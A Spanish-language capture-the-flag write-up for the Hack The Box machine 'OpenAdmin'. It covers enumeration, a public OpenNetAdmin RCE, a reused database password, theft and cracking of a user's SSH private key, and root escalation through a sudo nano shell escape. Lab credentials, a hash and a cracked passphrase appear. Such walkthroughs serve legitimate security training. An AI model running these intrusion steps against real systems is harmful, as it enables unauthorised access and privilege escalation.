# Openadmin ![Avatar](https://www.hackthebox.eu/storage/avatars/5b00db157dbbd7099ff6c0ef10f910ea_thumb.png)     

## Initial Scan

```nmap
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
## Enumeration

Empecemos enumerando el servicio web 
```bash
gobuster dir -u http://10.10.10.171/ -w wordlists/big.txt
/artwork (Status: 301)
/music (Status: 301)
/sierra (Status: 301)
```
Miramos en /music y cuando pulsas el login nos lleva a /ona donde se nor muestra una pantalla de el servicio OpenNetAdmin donde se nos revela que la versión es la 18.1.1
## Exploit

La versión de OpenNetAdmin presenta una vulerabilidad RCE conocida
```
https://www.exploit-db.com/exploits/47691
```
Usandolo obtenemos una shell como www-data

## Local recon

### Enumeramos usuarios con acceso via shell
```
$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
### Buscamos contraseñas
```
cat local/config/database
    'db_type' => 'mysqli',
    'db_host' => 'localhost',
    'db_login' => 'ona_sys',
    'db_passwd' => 'n1nj4W4rri0R!',
    'db_database' => 'ona_default',
    'db_debug' => false,
```
### Jimmy
Probamos la contrasña obtenida en jimmmy en joanna y obtenemos acceso a el usuario jimmy
```
jimmy@openadmin:~$ netstat -aln | grep 127
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:58948         127.0.0.1:52846         TIME_WAIT  
```
Vemos que hay paginas en localhost
```
jimmy@openadmin:~$ curl 127.0.0.1:52846
```
Vemos que tenemos una pagina de login
```
jimmy@openadmin:cd /var/www/internal
jimmy@openadmin:/var/www/internal$ ls -l
total 12
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

En index.php encontramos el siguiente fragmento de código
### Index.php
```
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
}
```
### Main.php
```
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
```
Con todo esto podriamos obtener el id_rsa de joanna y logearnos en su cuenta

El hash corresponde a la palabra Revealed, asi que podemos logearnos sin problema
```bash
curl -XPOST localhost:52846 -d "login&username=jimmy&password=Revealed" -L -v | grep PHPSESSID
PHPSESSID=i3spbj9jben1bon5alpr0ek1at
curl localhost:52846/main.php -H "PHPSESSID=i3spbj9jben1bon5alpr0ek1at" -v
```
Con esto obtenemos la clave RSA

### Crackeando la clave

Guardamos la clave RSA en local y la crrackeamos
```bash
$:/home/~/.JohnTheRipper/run/ssh2john.py OpenAdmin_rsa > hash.txt
$:/home/~/.JohnTheRipper/run/john hash.txt --wordlist=/home/~/rockyou.txt
> bloodninjas      (OpenAdmin_rsa)
```

### Joanna

```bash
$:ssh -i OpenAdmin_rsa joanna@10.10.10.171
joanna@openadmin:~$ wc -c user.txt 
33 user.txt
```

## Privesc

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
Veamos como podemos explotar esto
```bash
sudo /bin/nano /opt/priv
```
Una vez abierto nano con privilegios elevados usamos CTRL-R + CTRL+X y podemos ejecutar
```bash
reset; sh 1>&0 2>
```
Y solo nos quedaria leer la flag
```
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/joanna
# cd /root
# ls
root.txt
# wc -c root.txt
33 root.txt
```

